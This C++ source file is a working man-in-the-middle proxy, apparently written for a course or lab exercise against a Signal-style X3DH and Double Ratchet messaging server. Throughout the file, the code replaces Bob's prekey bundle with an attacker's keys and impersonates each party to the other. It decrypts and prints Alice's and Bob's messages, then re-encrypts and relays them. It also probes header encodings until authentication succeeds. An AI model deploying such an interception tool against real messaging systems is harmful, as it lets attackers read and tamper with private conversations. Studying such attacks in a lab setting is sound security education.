#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <cstring>
#include <netdb.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <json-c/json.h>
#include <openssl/evp.h>
#include <openssl/kdf.h>
#include <openssl/hmac.h>
#include <vector>
#include <map>
#include <chrono>

using namespace std;

// ===================== Key material & helpers =====================

struct KeyPair
{
    vector<unsigned char> priv;
    vector<unsigned char> pub;
};

KeyPair generate_key(int type)
{
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(type, nullptr);
    EVP_PKEY *key = nullptr;
    EVP_PKEY_keygen_init(ctx);
    EVP_PKEY_keygen(ctx, &key);
    KeyPair kp;
    kp.priv.resize(32);
    kp.pub.resize(32);
    size_t priv_len = 32, pub_len = 32;
    EVP_PKEY_get_raw_private_key(key, kp.priv.data(), &priv_len);
    EVP_PKEY_get_raw_public_key(key, kp.pub.data(), &pub_len);
    EVP_PKEY_free(key);
    EVP_PKEY_CTX_free(ctx);
    return kp;
}

string base64_encode(const vector<unsigned char> &data)
{
    string result(4 * ((data.size() + 2) / 3), '\0');
    EVP_EncodeBlock((unsigned char *)result.data(), data.data(), data.size());
    return result;
}

vector<unsigned char> base64_decode(string s)
{
    vector<unsigned char> result((s.size() * 3) / 4);
    int len = EVP_DecodeBlock(result.data(), (const unsigned char *)s.data(), s.size());
    while (!s.empty() && s.back() == '=')
    {
        len--;
        s.pop_back();
    }
    result.resize(max(len, 0));
    return result;
}

vector<unsigned char> sign_data(const vector<unsigned char> &priv, const vector<unsigned char> &data)
{
    EVP_PKEY *key = EVP_PKEY_new_raw_private_key(EVP_PKEY_ED25519, nullptr, priv.data(), priv.size());
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    EVP_DigestSignInit(ctx, nullptr, nullptr, nullptr, key);
    size_t sig_len = 64;
    vector<unsigned char> sig(sig_len);
    EVP_DigestSign(ctx, sig.data(), &sig_len, data.data(), data.size());
    sig.resize(sig_len);
    EVP_MD_CTX_free(ctx);
    EVP_PKEY_free(key);
    return sig;
}

vector<unsigned char> x25519_shared(const vector<unsigned char> &priv, const vector<unsigned char> &pub)
{
    EVP_PKEY *my_key = EVP_PKEY_new_raw_private_key(EVP_PKEY_X25519, nullptr, priv.data(), priv.size());
    EVP_PKEY *their_key = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, nullptr, pub.data(), pub.size());
    if (!my_key || !their_key)
    {
        cout << "[MITM] X25519 key creation failed!" << endl;
        if (my_key)
            EVP_PKEY_free(my_key);
        if (their_key)
            EVP_PKEY_free(their_key);
        return {};
    }
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(my_key, nullptr);
    size_t len = 32;
    vector<unsigned char> shared(len);
    if (!ctx || EVP_PKEY_derive_init(ctx) <= 0 ||
        EVP_PKEY_derive_set_peer(ctx, their_key) <= 0 ||
        EVP_PKEY_derive(ctx, shared.data(), &len) <= 0)
    {
        cout << "[MITM] X25519 derive failed!" << endl;
        if (ctx)
            EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(my_key);
        EVP_PKEY_free(their_key);
        return {};
    }
    shared.resize(len);
    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(my_key);
    EVP_PKEY_free(their_key);
    return shared;
}

vector<unsigned char> derive_hkdf(const vector<unsigned char> &salt, const vector<unsigned char> &ikm,
                                  const string &info, int output_len)
{
    vector<unsigned char> out(output_len);
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_HKDF, nullptr);
    if (EVP_PKEY_derive_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_hkdf_md(ctx, EVP_sha256()) <= 0 ||
        EVP_PKEY_CTX_set1_hkdf_salt(ctx, salt.data(), salt.size()) <= 0 ||
        EVP_PKEY_CTX_set1_hkdf_key(ctx, ikm.data(), ikm.size()) <= 0 ||
        EVP_PKEY_CTX_add1_hkdf_info(ctx, (unsigned char *)info.data(), info.size()) <= 0)
    {
        cout << "[MITM] HKDF setup failed!" << endl;
        EVP_PKEY_CTX_free(ctx);
        return {};
    }
    size_t len = output_len;
    if (EVP_PKEY_derive(ctx, out.data(), &len) <= 0)
    {
        cout << "[MITM] HKDF derive failed!" << endl;
        EVP_PKEY_CTX_free(ctx);
        return {};
    }
    EVP_PKEY_CTX_free(ctx);
    return out;
}

vector<unsigned char> derive_sk(const vector<unsigned char> &ikm)
{
    vector<unsigned char> salt(32, 0);
    return derive_hkdf(salt, ikm, "AS3_X3DH", 32);
}

vector<unsigned char> kdf_rk(const vector<unsigned char> &rk, const vector<unsigned char> &dh_out)
{
    return derive_hkdf(rk, dh_out, "AS3_ROOT", 64); // [0:32]=new RK, [32:64]=new CK
}

vector<unsigned char> hmac_sha256(const vector<unsigned char> &key, unsigned char value)
{
    vector<unsigned char> result(32);
    unsigned int len = 32;
    HMAC(EVP_sha256(), key.data(), key.size(), &value, 1, result.data(), &len);
    return result;
}

pair<vector<unsigned char>, vector<unsigned char>> kdf_ck(const vector<unsigned char> &ck)
{
    return {hmac_sha256(ck, 0x01), hmac_sha256(ck, 0x02)};
}

bool aead_decrypt(const vector<unsigned char> &key, const vector<unsigned char> &ct,
                  const vector<unsigned char> &ad, vector<unsigned char> &plaintext)
{
    if (ct.size() < 16)
        return false;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char nonce[12] = {0};
    int len = 0, plaintext_len = 0;
    int ciphertext_len = ct.size() - 16;

    plaintext.resize(ciphertext_len);

    bool ok =
        EVP_DecryptInit_ex(ctx, EVP_chacha20_poly1305(), nullptr, nullptr, nullptr) > 0 &&
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr) > 0 &&
        EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce) > 0 &&
        EVP_DecryptUpdate(ctx, nullptr, &len, ad.data(), ad.size()) > 0 &&
        EVP_DecryptUpdate(ctx, plaintext.data(), &len, ct.data(), ciphertext_len) > 0;

    plaintext_len = len;

    if (ok)
        ok = EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_TAG, 16,
                                 (void *)(ct.data() + ciphertext_len)) > 0;

    if (ok)
        ok = EVP_DecryptFinal_ex(ctx, plaintext.data() + plaintext_len, &len) > 0;

    plaintext_len += len;
    plaintext.resize(plaintext_len);

    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

bool aead_encrypt(const vector<unsigned char> &key, const vector<unsigned char> &plaintext,
                  const vector<unsigned char> &ad, vector<unsigned char> &ct_out)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char nonce[12] = {0};
    int len = 0, ciphertext_len = 0;
    ct_out.resize(plaintext.size() + 16);

    bool ok =
        EVP_EncryptInit_ex(ctx, EVP_chacha20_poly1305(), nullptr, nullptr, nullptr) > 0 &&
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr) > 0 &&
        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce) > 0 &&
        EVP_EncryptUpdate(ctx, nullptr, &len, ad.data(), ad.size()) > 0 &&
        EVP_EncryptUpdate(ctx, ct_out.data(), &len, plaintext.data(), plaintext.size()) > 0;

    if (!ok)
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    ciphertext_len = len;
    if (EVP_EncryptFinal_ex(ctx, ct_out.data() + ciphertext_len, &len) <= 0)
    {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    ciphertext_len += len;
    unsigned char tag[16];
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_GET_TAG, 16, tag);
    ct_out.resize(ciphertext_len + 16);
    memcpy(ct_out.data() + ciphertext_len, tag, 16);
    EVP_CIPHER_CTX_free(ctx);
    return true;
}

// protocol.md's serialize(header) byte encoding is left unspecified by the
// pseudocode. We try the candidates most likely for a Go JSON backend (the
// server's log format strongly suggests Go, where map[string]interface{}
// marshals keys alphabetically by default) and lock in whichever one
// actually verifies, reusing it for all further traffic in that session.
int g_header_format = -1; // -1 = not yet learned

string serialize_header_variant(const string &dh_b64, int pn, int n, int variant)
{
    switch (variant)
    {
    case 0: // compact, dh/pn/n order (literal protocol.md pseudocode order)
        return "{\"dh\":\"" + dh_b64 + "\",\"pn\":" + to_string(pn) + ",\"n\":" + to_string(n) + "}";
    case 1: // compact, alphabetical key order (dh,n,pn) - typical Go map marshaling
        return "{\"dh\":\"" + dh_b64 + "\",\"n\":" + to_string(n) + ",\"pn\":" + to_string(pn) + "}";
    case 2: // spaced, dh/pn/n order
        return "{\"dh\": \"" + dh_b64 + "\", \"pn\": " + to_string(pn) + ", \"n\": " + to_string(n) + "}";
    case 3: // spaced, alphabetical order
        return "{\"dh\": \"" + dh_b64 + "\", \"n\": " + to_string(n) + ", \"pn\": " + to_string(pn) + "}";
    }
    return "";
}

// ===================== Mallory's own identity =====================

KeyPair mallory_ik_sig, mallory_ik_dh, mallory_spk;
string mallory_ik_sig_pub, mallory_ik_dh_pub, mallory_spk_pub, mallory_spk_sig;

void generate_mallory_keys()
{
    mallory_ik_sig = generate_key(EVP_PKEY_ED25519);
    mallory_ik_dh = generate_key(EVP_PKEY_X25519);
    mallory_spk = generate_key(EVP_PKEY_X25519);
    vector<unsigned char> sig = sign_data(mallory_ik_sig.priv, mallory_spk.pub);

    mallory_ik_sig_pub = base64_encode(mallory_ik_sig.pub);
    mallory_ik_dh_pub = base64_encode(mallory_ik_dh.pub);
    mallory_spk_pub = base64_encode(mallory_spk.pub);
    mallory_spk_sig = base64_encode(sig);

    cout << "\n[MITM] Mallory's own keys generated (for the fake-Alice-to-Bob session)\n";
}

// ===================== Per-peer ratchet session state =====================

struct RatchetState
{
    vector<unsigned char> RK;
    vector<unsigned char> DHr;
    KeyPair DHs;
    vector<unsigned char> CKs, CKr;
    int Ns = 0, Nr = 0, PN = 0;
    vector<unsigned char> AD;
    bool initialized = false;
};

RatchetState sess_alice; // Mallory impersonating Bob, talking to real Alice
RatchetState sess_bob;   // Mallory impersonating Alice, talking to real Bob

mutex state_mtx;

string bob_ik_sig_b64, bob_ik_dh_b64, bob_spk_b64, bob_spk_sig_b64, bob_opk_b64;
int bob_opk_id = 0;
bool have_bob_bundle = false;

bool x3dh_respond_as_bob(json_object *init_obj, RatchetState &st)
{
    json_object *ik_dh_o = nullptr, *ek_o = nullptr;
    json_object_object_get_ex(init_obj, "ik_dh", &ik_dh_o);
    json_object_object_get_ex(init_obj, "ek", &ek_o);
    if (!ik_dh_o || !ek_o)
        return false;

    vector<unsigned char> alice_ik_dh = base64_decode(json_object_get_string(ik_dh_o));
    vector<unsigned char> alice_ek = base64_decode(json_object_get_string(ek_o));

    vector<unsigned char> dh1 = x25519_shared(mallory_spk.priv, alice_ik_dh);
    vector<unsigned char> dh2 = x25519_shared(mallory_ik_dh.priv, alice_ek);
    vector<unsigned char> dh3 = x25519_shared(mallory_spk.priv, alice_ek);

    cout << "[MITM][debug] DH1_len=" << dh1.size()
         << " DH2_len=" << dh2.size()
         << " DH3_len=" << dh3.size() << endl;

    cout << "[MITM][debug] Alice IK_DH length=" << alice_ik_dh.size()
         << " Alice EK length=" << alice_ek.size() << endl;

    vector<unsigned char> ikm(32, 0xFF);
    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
    ikm.insert(ikm.end(), dh3.begin(), dh3.end());

    st.RK = derive_sk(ikm);
    cout << "[MITM][debug] (as Bob) SK=" << base64_encode(st.RK) << endl;

    st.AD = alice_ik_dh;
    st.AD.insert(st.AD.end(), mallory_ik_dh.pub.begin(), mallory_ik_dh.pub.end());
    cout << "[MITM][debug] (as Bob) AD_len=" << st.AD.size() << endl;

    st.DHs = mallory_spk;
    st.DHr.clear();
    st.initialized = true;

    cout << "[MITM] (as Bob) X3DH complete with Alice\n";
    return true;
}

bool x3dh_initiate_as_alice(RatchetState &st, json_object *&init_out)
{
    if (!have_bob_bundle)
        return false;

    vector<unsigned char> bob_spk = base64_decode(bob_spk_b64);
    vector<unsigned char> bob_ik_dh = base64_decode(bob_ik_dh_b64);

    KeyPair ek = generate_key(EVP_PKEY_X25519);

    vector<unsigned char> dh1 = x25519_shared(mallory_ik_dh.priv, bob_spk);
    vector<unsigned char> dh2 = x25519_shared(ek.priv, bob_ik_dh);
    vector<unsigned char> dh3 = x25519_shared(ek.priv, bob_spk);

    vector<unsigned char> ikm(32, 0xFF);
    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
    ikm.insert(ikm.end(), dh3.begin(), dh3.end());

    if (!bob_opk_b64.empty() && bob_opk_id != 0)
    {
        vector<unsigned char> opk = base64_decode(bob_opk_b64);
        vector<unsigned char> dh4 = x25519_shared(ek.priv, opk);
        ikm.insert(ikm.end(), dh4.begin(), dh4.end());
    }

    st.RK = derive_sk(ikm);
    cout << "[MITM][debug] (as Alice) SK=" << base64_encode(st.RK) << endl;

    st.AD = mallory_ik_dh.pub;
    st.AD.insert(st.AD.end(), bob_ik_dh.begin(), bob_ik_dh.end());
    cout << "[MITM][debug] (as Alice) AD_len=" << st.AD.size() << endl;

    st.DHs = generate_key(EVP_PKEY_X25519);
    st.DHr = bob_spk;
    vector<unsigned char> dh_out = x25519_shared(st.DHs.priv, bob_spk);
    vector<unsigned char> rk_ck = kdf_rk(st.RK, dh_out);
    st.RK.assign(rk_ck.begin(), rk_ck.begin() + 32);
    st.CKs.assign(rk_ck.begin() + 32, rk_ck.end());
    st.initialized = true;

    init_out = json_object_new_object();
    json_object_object_add(init_out, "ik_sig", json_object_new_string(mallory_ik_sig_pub.c_str()));
    json_object_object_add(init_out, "ik_dh", json_object_new_string(mallory_ik_dh_pub.c_str()));
    json_object_object_add(init_out, "ek", json_object_new_string(base64_encode(ek.pub).c_str()));
    json_object_object_add(init_out, "opk_id", json_object_new_int(bob_opk_id));

    cout << "[MITM] (as Alice) X3DH initiated with Bob\n";
    return true;
}

void dh_ratchet(RatchetState &st, const vector<unsigned char> &new_dhr)
{
    st.PN = st.Ns;
    st.Ns = 0;
    st.Nr = 0;
    st.DHr = new_dhr;

    vector<unsigned char> dh1 = x25519_shared(st.DHs.priv, st.DHr);
    vector<unsigned char> out1 = kdf_rk(st.RK, dh1);
    st.RK.assign(out1.begin(), out1.begin() + 32);
    st.CKr.assign(out1.begin() + 32, out1.end());

    st.DHs = generate_key(EVP_PKEY_X25519);
    vector<unsigned char> dh2 = x25519_shared(st.DHs.priv, st.DHr);
    vector<unsigned char> out2 = kdf_rk(st.RK, dh2);
    st.RK.assign(out2.begin(), out2.begin() + 32);
    st.CKs.assign(out2.begin() + 32, out2.end());

    cout << "[MITM] DH ratchet step performed (new peer dh observed)\n";
}

bool ratchet_decrypt(RatchetState &st, json_object *header, const vector<unsigned char> &ct,
                     vector<unsigned char> &plaintext_out)
{
    string dh_b64 = json_object_get_string(json_object_object_get(header, "dh"));
    int pn = json_object_get_int(json_object_object_get(header, "pn"));
    int n = json_object_get_int(json_object_object_get(header, "n"));
    vector<unsigned char> dh = base64_decode(dh_b64);

    if (st.DHr.empty() || dh != st.DHr)
    {
        dh_ratchet(st, dh);
        cout << "[MITM][debug] DHr_len=" << st.DHr.size()
             << " CKr_len=" << st.CKr.size()
             << " RK_len=" << st.RK.size() << endl;
    }

    vector<unsigned char> mk;
    while (st.Nr <= n)
    {
        auto kv = kdf_ck(st.CKr);
        mk = kv.first;
        st.CKr = kv.second;
        st.Nr++;
    }

    cout << "[MITM][debug] decrypt attempt: ct_len=" << ct.size()
         << " ad_prefix_len=" << st.AD.size()
         << " mk=" << base64_encode(mk) << endl;

    // Try the previously-learned header format first.
    if (g_header_format != -1)
    {
        vector<unsigned char> ad = st.AD;
        string hdr = serialize_header_variant(dh_b64, pn, n, g_header_format);
        ad.insert(ad.end(), hdr.begin(), hdr.end());
        if (aead_decrypt(mk, ct, ad, plaintext_out))
            return true;
    }

    // Otherwise (or if the learned format stops working) probe all variants.
    for (int variant = 0; variant < 4; variant++)
    {
        if (variant == g_header_format)
            continue;
        vector<unsigned char> ad = st.AD;
        string hdr = serialize_header_variant(dh_b64, pn, n, variant);
        ad.insert(ad.end(), hdr.begin(), hdr.end());
        if (aead_decrypt(mk, ct, ad, plaintext_out))
        {
            g_header_format = variant;
            cout << "[MITM] Header AD format learned: variant " << variant << endl;
            return true;
        }
    }

    cout << "[MITM][debug] AEAD authentication failed for all header-format candidates\n";
    return false;
}

void ratchet_encrypt(RatchetState &st, const vector<unsigned char> &plaintext,
                     json_object *&header_out, string &ct_b64_out)
{
    auto kv = kdf_ck(st.CKs);
    vector<unsigned char> mk = kv.first;
    st.CKs = kv.second;

    string dh_b64 = base64_encode(st.DHs.pub);
    int pn = st.PN;
    int n = st.Ns;
    st.Ns++;

    vector<unsigned char> ad = st.AD;
    int fmt = (g_header_format == -1) ? 0 : g_header_format;
    string hdr = serialize_header_variant(dh_b64, pn, n, fmt);
    ad.insert(ad.end(), hdr.begin(), hdr.end());

    vector<unsigned char> ct;
    aead_encrypt(mk, plaintext, ad, ct);
    ct_b64_out = base64_encode(ct);

    header_out = json_object_new_object();
    json_object_object_add(header_out, "dh", json_object_new_string(dh_b64.c_str()));
    json_object_object_add(header_out, "pn", json_object_new_int(pn));
    json_object_object_add(header_out, "n", json_object_new_int(n));
}

// ===================== Networking =====================

int connect_server()
{
    hostent *host = gethostbyname("as3_server");
    if (!host)
        return -1;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9000);
    memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
    if (connect(fd, (sockaddr *)&addr, sizeof(addr)) < 0)
    {
        close(fd);
        return -1;
    }
    return fd;
}

void send_line(int fd, const string &line)
{
    string out = line + "\n";
    size_t sent = 0;
    while (sent < out.size())
    {
        ssize_t k = send(fd, out.data() + sent, out.size() - sent, MSG_NOSIGNAL);
        if (k <= 0)
            return;
        sent += k;
    }
}

string recv_line(int fd, string &pending)
{
    while (pending.find('\n') == string::npos)
    {
        char buf[4096];
        int n = recv(fd, buf, sizeof(buf), 0);
        if (n <= 0)
            return "";
        pending.append(buf, n);
    }
    size_t pos = pending.find('\n');
    string line = pending.substr(0, pos);
    pending.erase(0, pos + 1);
    return line;
}

int mallory_server_fd = -1;
string mallory_pending;
mutex mallory_net_mtx;

void mallory_register_and_fetch_bob()
{
    lock_guard<mutex> lk(mallory_net_mtx);
    mallory_server_fd = connect_server();
    if (mallory_server_fd < 0)
    {
        cout << "[MITM] couldn't connect as Mallory\n";
        return;
    }

    json_object *reg = json_object_new_object();
    json_object_object_add(reg, "type", json_object_new_string("register"));
    json_object_object_add(reg, "user", json_object_new_string("mallory_shadow"));
    send_line(mallory_server_fd, json_object_to_json_string_ext(reg, JSON_C_TO_STRING_PLAIN));
    json_object_put(reg);
    recv_line(mallory_server_fd, mallory_pending);

    json_object *fetch = json_object_new_object();
    json_object_object_add(fetch, "type", json_object_new_string("fetch_bundle"));
    json_object_object_add(fetch, "user", json_object_new_string("bob"));
    send_line(mallory_server_fd, json_object_to_json_string_ext(fetch, JSON_C_TO_STRING_PLAIN));
    json_object_put(fetch);

    string resp = recv_line(mallory_server_fd, mallory_pending);
    json_object *root = json_tokener_parse(resp.c_str());
    if (!root)
        return;
    json_object *bundle = nullptr;
    if (json_object_object_get_ex(root, "bundle", &bundle))
    {
        bob_ik_sig_b64 = json_object_get_string(json_object_object_get(bundle, "ik_sig"));
        bob_ik_dh_b64 = json_object_get_string(json_object_object_get(bundle, "ik_dh"));
        bob_spk_b64 = json_object_get_string(json_object_object_get(bundle, "spk"));
        bob_spk_sig_b64 = json_object_get_string(json_object_object_get(bundle, "spk_sig"));
        json_object *opk_o = json_object_object_get(bundle, "opk");
        json_object *opk_id_o = json_object_object_get(bundle, "opk_id");
        bob_opk_b64 = opk_o ? json_object_get_string(opk_o) : "";
        bob_opk_id = opk_id_o ? json_object_get_int(opk_id_o) : 0;
        have_bob_bundle = true;
        cout << "[MITM] Fetched Bob's REAL bundle (opk_id=" << bob_opk_id << ")\n";
    }
    json_object_put(root);
}

void forward_to_bob(const vector<unsigned char> &plaintext)
{
    lock_guard<mutex> lk(mallory_net_mtx);
    if (mallory_server_fd < 0)
    {
        cout << "[MITM] no connection to server as Mallory\n";
        return;
    }

    json_object *init_obj = nullptr;
    bool first_message = !sess_bob.initialized;
    if (first_message)
    {
        if (!x3dh_initiate_as_alice(sess_bob, init_obj))
        {
            cout << "[MITM] cannot forward to Bob: no bundle yet\n";
            return;
        }
    }

    json_object *header = nullptr;
    string ct_b64;
    ratchet_encrypt(sess_bob, plaintext, header, ct_b64);

    if (first_message)
        json_object_object_add(header, "init", init_obj);

    json_object *frame = json_object_new_object();
    json_object_object_add(frame, "from", json_object_new_string("mallory_shadow"));
    json_object_object_add(frame, "to", json_object_new_string("bob"));
    json_object_object_add(frame, "header", header);
    json_object_object_add(frame, "ct", json_object_new_string(ct_b64.c_str()));

    json_object *req = json_object_new_object();
    json_object_object_add(req, "type", json_object_new_string("send"));
    json_object_object_add(req, "frame", frame);

    send_line(mallory_server_fd, json_object_to_json_string_ext(req, JSON_C_TO_STRING_PLAIN));
    cout << "[MITM] Forwarded plaintext to Bob (via Mallory's own session): "
         << string(plaintext.begin(), plaintext.end()) << endl;

    json_object_put(req);
    recv_line(mallory_server_fd, mallory_pending);
}

int g_client_fd_for_alice_relay = -1;

void forward_plaintext_to_alice(const vector<unsigned char> &plaintext)
{
    lock_guard<mutex> lk(state_mtx);
    if (!sess_alice.initialized || g_client_fd_for_alice_relay < 0)
    {
        cout << "[MITM] cannot relay to Alice yet (no session)\n";
        return;
    }
    json_object *header = nullptr;
    string ct_b64;
    ratchet_encrypt(sess_alice, plaintext, header, ct_b64);

    json_object *frame = json_object_new_object();
    json_object_object_add(frame, "from", json_object_new_string("bob"));
    json_object_object_add(frame, "to", json_object_new_string("alice"));
    json_object_object_add(frame, "header", header);
    json_object_object_add(frame, "ct", json_object_new_string(ct_b64.c_str()));

    json_object *req = json_object_new_object();
    json_object_object_add(req, "type", json_object_new_string("frames"));
    json_object *arr = json_object_new_array();
    json_object_array_add(arr, frame);
    json_object_object_add(req, "frames", arr);

    send_line(g_client_fd_for_alice_relay, json_object_to_json_string_ext(req, JSON_C_TO_STRING_PLAIN));
    json_object_put(req);
    cout << "[MITM] Relayed Bob's plaintext to Alice (re-encrypted under fake-Bob session)\n";
}

void poll_bob_loop()
{
    while (true)
    {
        this_thread::sleep_for(chrono::milliseconds(500));
        lock_guard<mutex> lk(mallory_net_mtx);
        if (mallory_server_fd < 0)
            continue;

        json_object *poll = json_object_new_object();
        json_object_object_add(poll, "type", json_object_new_string("poll"));
        json_object_object_add(poll, "user", json_object_new_string("mallory_shadow"));
        send_line(mallory_server_fd, json_object_to_json_string_ext(poll, JSON_C_TO_STRING_PLAIN));
        json_object_put(poll);

        string resp = recv_line(mallory_server_fd, mallory_pending);
        if (resp.empty())
            continue;
        json_object *root = json_tokener_parse(resp.c_str());
        if (!root)
            continue;
        json_object *frames = nullptr;
        if (json_object_object_get_ex(root, "frames", &frames) &&
            json_object_get_type(frames) == json_type_array)
        {
            int count = json_object_array_length(frames);
            for (int i = 0; i < count; i++)
            {
                json_object *f = json_object_array_get_idx(frames, i);
                json_object *header = nullptr, *ct_obj = nullptr;
                json_object_object_get_ex(f, "header", &header);
                json_object_object_get_ex(f, "ct", &ct_obj);
                vector<unsigned char> ct = base64_decode(json_object_get_string(ct_obj));
                vector<unsigned char> plaintext;
                if (ratchet_decrypt(sess_bob, header, ct, plaintext))
                {
                    cout << "[MITM] Decrypted Bob's reply: "
                         << string(plaintext.begin(), plaintext.end()) << endl;
                    forward_plaintext_to_alice(plaintext);
                }
                else
                {
                    cout << "[MITM] Failed to decrypt Bob's reply\n";
                }
            }
        }
        json_object_put(root);
    }
}

// ===================== Bundle substitution (Mallory as fake-Bob to Alice) =====================

string modify_bundle(string line, bool request)
{
    if (request)
        return line;
    json_object *root = json_tokener_parse(line.c_str());
    if (!root)
        return line;

    json_object *type = nullptr;
    json_object_object_get_ex(root, "type", &type);
    if (!type || string(json_object_get_string(type)) != "bundle")
    {
        json_object_put(root);
        return line;
    }

    json_object *bundle = nullptr, *user = nullptr;
    if (!json_object_object_get_ex(root, "bundle", &bundle) ||
        !json_object_object_get_ex(bundle, "user", &user) ||
        string(json_object_get_string(user)) != "bob")
    {
        json_object_put(root);
        return line;
    }

    cout << "\n[MITM] Replacing Bob's bundle with Mallory's keys (fake-Bob-to-Alice)\n";
    json_object_object_add(bundle, "ik_sig", json_object_new_string(mallory_ik_sig_pub.c_str()));
    json_object_object_add(bundle, "ik_dh", json_object_new_string(mallory_ik_dh_pub.c_str()));
    json_object_object_add(bundle, "spk", json_object_new_string(mallory_spk_pub.c_str()));
    json_object_object_add(bundle, "spk_sig", json_object_new_string(mallory_spk_sig.c_str()));
    json_object_object_add(bundle, "opk", json_object_new_string(""));
    json_object_object_add(bundle, "opk_id", json_object_new_int(0));

    string modified = json_object_to_json_string_ext(root, JSON_C_TO_STRING_PLAIN);

    cout << "[MITM][debug] Substituted bundle ik_dh=" << mallory_ik_dh_pub.substr(0, 16)
         << "... spk=" << mallory_spk_pub.substr(0, 16) << "...\n";
    cout << "[MITM][debug] Outgoing bundle JSON: " << modified << endl;

    json_object_put(root);
    return modified;
}

// ===================== Alice-facing relay =====================

bool handle_incoming_from_alice(json_object *frame)
{
    json_object *header = nullptr, *ct_obj = nullptr;
    json_object_object_get_ex(frame, "header", &header);
    json_object_object_get_ex(frame, "ct", &ct_obj);

    if (!header || !ct_obj)
        return false;

    vector<unsigned char> plaintext;

    {
        lock_guard<mutex> lk(state_mtx);
        json_object *init_obj = nullptr;

        if (!sess_alice.initialized && json_object_object_get_ex(header, "init", &init_obj))
        {
            if (!x3dh_respond_as_bob(init_obj, sess_alice))
            {
                cout << "[MITM] X3DH respond failed" << endl;
                return false;
            }
        }

        if (!sess_alice.initialized)
            return false;

        vector<unsigned char> ct = base64_decode(json_object_get_string(ct_obj));
        if (!ratchet_decrypt(sess_alice, header, ct, plaintext))
        {
            cout << "[MITM] Failed to decrypt Alice's message" << endl;
            return false;
        }
    }

    cout << "[MITM] Decrypted Alice's message: "
         << string(plaintext.begin(), plaintext.end()) << endl;
    forward_to_bob(plaintext);
    return true;
}

bool inspect_and_act(string line, bool request)
{
    json_object *root = json_tokener_parse(line.c_str());
    if (!root)
        return false;

    json_object *type = nullptr;
    json_object_object_get_ex(root, "type", &type);
    string msg_type = type ? json_object_get_string(type) : "";

    // Don't print repetitive polling traffic
    if (msg_type != "poll" && msg_type != "frames")
    {
        cout << "[PROXY] " << (request ? "CLIENT -> SERVER: " : "SERVER -> CLIENT: ")
             << msg_type << endl;
    }

    bool handled = false;
    if (request && msg_type == "send")
    {
        json_object *frame = nullptr;
        if (json_object_object_get_ex(root, "frame", &frame))
            handled = handle_incoming_from_alice(frame);
    }

    json_object_put(root);
    return handled;
}

void relay(int src, int dst, bool request)
{
    char buf[4096];
    string pending;
    while (true)
    {
        int n = recv(src, buf, sizeof(buf), 0);
        if (n <= 0)
            break;
        pending.append(buf, n);
        size_t pos;
        while ((pos = pending.find('\n')) != string::npos)
        {
            string line = pending.substr(0, pos);
            pending.erase(0, pos + 1);

            bool handled = inspect_and_act(line, request);

            if (request && handled)
            {
                cout << "[PROXY] Original ciphertext dropped" << endl;
                continue;
            }

            line = modify_bundle(line, request);
            line += "\n";

            size_t sent = 0;
            while (sent < line.size())
            {
                ssize_t k = send(dst, line.data() + sent, line.size() - sent, MSG_NOSIGNAL);
                if (k <= 0)
                    return;
                sent += k;
            }
        }
    }
    shutdown(dst, SHUT_WR);
}

void handle_client(int client)
{
    int server = connect_server();
    if (server < 0)
    {
        close(client);
        return;
    }

    cout << "New client connected\n";
    g_client_fd_for_alice_relay = client;

    mallory_register_and_fetch_bob();
    thread poll_thread(poll_bob_loop);
    poll_thread.detach();

    thread t1(relay, client, server, true);
    thread t2(relay, server, client, false);
    t1.join();
    t2.join();
    close(server);
    close(client);
}

int main()
{
    generate_mallory_keys();

    int listener = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9001);
    if (bind(listener, (sockaddr *)&addr, sizeof(addr)) < 0 || listen(listener, 10) < 0)
    {
        perror("listen");
        return 1;
    }
    cout << "Attack 2 MITM proxy listening on port 9001\n";

    while (true)
    {
        int client = accept(listener, nullptr, nullptr);
        if (client < 0)
            continue;
        thread(handle_client, client).detach();
    }
}